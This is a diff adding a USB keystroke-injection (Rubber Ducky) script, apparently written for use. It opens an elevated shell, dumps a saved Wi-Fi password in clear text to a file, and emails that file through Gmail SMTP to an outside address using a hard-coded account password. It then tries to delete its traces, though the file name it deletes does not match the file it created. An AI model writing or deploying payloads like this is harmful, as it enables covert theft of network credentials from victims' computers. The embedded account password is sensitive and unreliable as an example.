@@ -1,0 +1,63 @@
+REM AUTHEUR : Valentin SARRE
+DELAY 2500
+GUI x
+DELAY 100
+STRING a
+DELAY 500
+LEFTARROW
+DELAY 300
+ENTER
+DELAY 500
+STRING netsh wlan show profile NAME=NOM_DE_TA_BOX key=clear > C:\MotdePasse.txt
+DELAY 100
+ENTER
+DELAY 500
+GUI r
+DELAY 100
+STRING powershell
+DELAY 100
+ENTER
+DELAY 1000
+STRING $SMTPServer = 'smtp.gmail.com'
+ENTER
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+STRING $SMTPInfo.EnableSsl = $true
+ENTER
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('tonmail@gmail.com', 'ankenna75');
+ENTER
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+STRING $ReportEmail.From = 'tonmail@gmail.com'
+ENTER
+STRING $ReportEmail.To.Add('mailreception@gmail.com')
+ENTER
+STRING $ReportEmail.Subject = 'Wi-fi Password'
+ENTER
+STRING $ReportEmail.Body = 'Attached is a file containing the wifi password'
+ENTER
+STRING $ReportEmail.Attachments.Add('c:\MotdePasse.txt')
+ENTER
+STRING $SMTPInfo.Send($ReportEmail)
+ENTER
+DELAY 3000
+STRING exit
+DELAY 100
+ENTER
+DELAY 500
+STRING cd ..
+DELAY 100
+ENTER
+DELAY 500
+STRING cd ..
+DELAY 100
+ENTER
+DELAY 500
+STRING del wifiPassword.txt
+DELAY 100
+ENTER
+DELAY 500
+DELAY 1000
+STRING exit
+DELAY 100
+ENTER
